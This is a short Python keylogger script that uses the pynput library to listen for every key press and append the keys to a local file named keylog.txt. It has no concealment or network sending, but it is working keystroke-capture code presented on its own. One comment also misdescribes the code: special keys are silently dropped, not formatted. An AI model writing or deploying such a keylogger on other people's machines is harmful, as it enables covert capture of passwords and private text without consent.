from pynput import keyboard

# Function to write the key pressed to a log file
def write_to_file(key):
    key_data = str(key)
    # Remove unnecessary characters from the key data
    key_data = key_data.replace("'", "")

    # If special keys like 'Key.enter' or 'Key.space' are pressed, format them
    if key_data.find('Key') == -1:
        with open("keylog.txt", 'a') as f:
            f.write(key_data + "\n")

# Function to handle key presses
def on_press(key):
    write_to_file(key)

# Function to handle key releases (not used in this example)
def on_release(key):
    pass

# Collect events until stopped
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
